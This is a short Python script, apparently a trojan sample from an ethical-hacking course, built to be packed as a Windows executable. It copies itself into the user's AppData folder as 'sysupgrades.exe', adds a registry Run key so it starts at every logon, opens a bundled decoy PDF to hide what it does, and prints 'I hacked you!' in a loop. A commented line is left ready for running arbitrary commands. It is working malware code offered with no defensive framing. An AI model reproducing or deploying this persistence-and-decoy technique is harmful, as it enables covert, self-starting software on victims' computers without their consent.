import time
import subprocess
import os
import shutil
import sys

def add_to_registry():

	file_path = os.environ["appdata"] + "\\sysupgrades.exe"
	if not os.path.exists(file_path):
		shutil.copyfile(sys.executable, file_path)
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + file_path
		subprocess.call(regedit_command, shell=True)

add_to_registry()

def open_file():
	file = sys._MEIPASS + "\\Ceh.pdf"
	subprocess.Popen(file, shell=True)

open_file()

x = 0
while x<100:
	print("I hacked you!")
	x+=1
	time.sleep(0.5)

# check = subprocess.check_output("command", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
